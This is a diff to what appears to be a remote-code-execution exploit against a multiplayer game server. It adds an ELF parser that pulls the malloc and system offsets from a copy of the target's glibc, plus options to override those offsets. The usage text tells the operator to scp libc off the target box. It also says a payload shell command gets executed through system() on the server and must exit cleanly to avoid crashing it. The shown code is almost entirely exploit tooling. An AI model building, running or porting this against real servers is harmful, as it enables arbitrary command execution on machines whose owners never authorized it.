@@ -40,6 +40,46 @@ struct Profile {
 };
 static Profile P = { 0x2b5f90, 0x2c31f8, 0x2c3660, 0xad750, 0x58750 };
 
+// Read malloc/system offsets straight out of a copy of the TARGET's libc.so.6. glibc patch builds shift
+// symbol offsets, so the baked-in defaults only match the exact build they were measured on. Minimal ELF64
+// parse (macOS has no <elf.h>): walk section headers for .dynsym, match symbol names in its linked strtab.
+struct E64Ehdr { unsigned char e_ident[16]; uint16_t e_type, e_machine; uint32_t e_version;
+                 uint64_t e_entry, e_phoff, e_shoff; uint32_t e_flags;
+                 uint16_t e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx; };
+struct E64Shdr { uint32_t sh_name, sh_type; uint64_t sh_flags, sh_addr, sh_offset, sh_size;
+                 uint32_t sh_link, sh_info; uint64_t sh_addralign, sh_entsize; };
+struct E64Sym  { uint32_t st_name; unsigned char st_info, st_other; uint16_t st_shndx;
+                 uint64_t st_value, st_size; };
+
+static bool readLibcOffsets(const char *path, uint64_t &malloc_off, uint64_t &system_off)
+{
+    FILE *f = fopen(path, "rb"); if (!f) { perror(path); return false; }
+    fseek(f, 0, SEEK_END); long n = ftell(f); fseek(f, 0, SEEK_SET);
+    std::vector<char> buf(n > 0 ? n : 0);
+    if (n < 64 || fread(buf.data(), 1, n, f) != (size_t)n) { fclose(f); fprintf(stderr, "%s: short read\n", path); return false; }
+    fclose(f);
+    if (memcmp(buf.data(), "\x7f""ELF", 4) != 0 || (unsigned char)buf[4] != 2) { fprintf(stderr, "%s: not a 64-bit ELF\n", path); return false; }
+    E64Ehdr *eh = (E64Ehdr *)buf.data();
+    if (eh->e_shoff == 0 || eh->e_shoff + (uint64_t)eh->e_shnum * sizeof(E64Shdr) > (uint64_t)n) return false;
+    E64Shdr *sh = (E64Shdr *)(buf.data() + eh->e_shoff);
+    bool gotM = false, gotS = false;
+    for (int i = 0; i < eh->e_shnum; i++) {
+        if (sh[i].sh_type != 11 /*SHT_DYNSYM*/ || sh[i].sh_entsize == 0) continue;
+        E64Sym *sym = (E64Sym *)(buf.data() + sh[i].sh_offset);
+        long cnt = sh[i].sh_size / sizeof(E64Sym);
+        const char *str = buf.data() + sh[sh[i].sh_link].sh_offset;
+        for (long k = 0; k < cnt; k++) {
+            if (!sym[k].st_value) continue;                       // skip UND imports
+            const char *nm = str + sym[k].st_name;
+            if (!strcmp(nm, "malloc")) { malloc_off = sym[k].st_value; gotM = true; }
+            else if (!strcmp(nm, "system")) { system_off = sym[k].st_value; gotS = true; }
+        }
+    }
+    if (!gotM || !gotS) fprintf(stderr, "%s: could not find %s%s%s in .dynsym\n", path,
+                                gotM ? "" : "malloc", (!gotM && !gotS) ? " and " : "", gotS ? "" : "system");
+    return gotM && gotS;
+}
+
 struct D12 { uint32_t a, b, c; };
 struct CellData12 { int mFlags, mX, mY; };
 struct Pos3 { float p[3]; };
@@ -286,6 +326,11 @@ static void usage(const char *a0)
       "  -C, --cell <name>           cell to meet in (default: ExploitCell)\n"
       "  -p, --probe                 connect both clients to POSTLOADED, report reachability, and STOP.\n"
       "                              Touches no server memory: safe to run against a live server.\n"
+      "  -L, --libc <path>           read malloc/system offsets from a copy of the TARGET's libc.so.6.\n"
+      "                              Needed unless the target runs the same glibc build as the defaults.\n"
+      "                              scp it off the box: scp user@target:/lib/x86_64-linux-gnu/libc.so.6 .\n"
+      "  -M, --malloc-off <hex>      override malloc offset in libc (default 0xad750, glibc 2.39-0ubuntu8.8)\n"
+      "  -S, --system-off <hex>      override system offset in libc (default 0x58750)\n"
       "  -v, --verbose               show relay parsing\n"
       "  -h, --help                  this text\n\n"
       "Payload must exit 0 to leave the server running: strlen's return value becomes the command's\n"
@@ -306,9 +351,12 @@ int main(int argc, char **argv)
         {"token", required_argument, 0, 't'}, {"bind", required_argument, 0, 'b'},
         {"name", required_argument, 0, 'n'}, {"cell", required_argument, 0, 'C'},
         {"probe", no_argument, 0, 'p'},
+        {"libc", required_argument, 0, 'L'},
+        {"malloc-off", required_argument, 0, 'M'}, {"system-off", required_argument, 0, 'S'},
         {"verbose", no_argument, 0, 'v'}, {"help", no_argument, 0, 'h'}, {0, 0, 0, 0}};
+    const char *libcPath = 0;
     int c;
-    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:pvh", lo, 0)) != -1) {
+    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:pL:M:S:vh", lo, 0)) != -1) {
         switch (c) {
             case 'P': g_srvpass = optarg; break;
             case 'c': cmd = optarg; break;
@@ -317,12 +365,23 @@ int main(int argc, char **argv)
             case 'n': nameBase = optarg; break;
             case 'C': cell = optarg; break;
             case 'p': g_probe = 1; break;
+            case 'L': libcPath = optarg; break;
+            case 'M': P.malloc_off = strtoull(optarg, 0, 0); break;
+            case 'S': P.system_off = strtoull(optarg, 0, 0); break;
             case 'v': g_verbose = 1; break;
             default: usage(argv[0]); return 2;
         }
     }
     if (optind < argc) g_host = argv[optind++];
     if (optind < argc) g_port = atoi(argv[optind++]);
+
+    if (libcPath) {
+        if (!readLibcOffsets(libcPath, P.malloc_off, P.system_off)) {
+            printf("[!] could not read libc offsets from %s\n", libcPath); return 2;
+        }
+        printf("[*] libc %s: malloc@%#llx system@%#llx\n", libcPath,
+               (unsigned long long)P.malloc_off, (unsigned long long)P.system_off);
+    }
 
     printf("[*] target %s:%d   server-password: %s\n", g_host, g_port,
            *g_srvpass ? "supplied" : "(none, upstream default)");
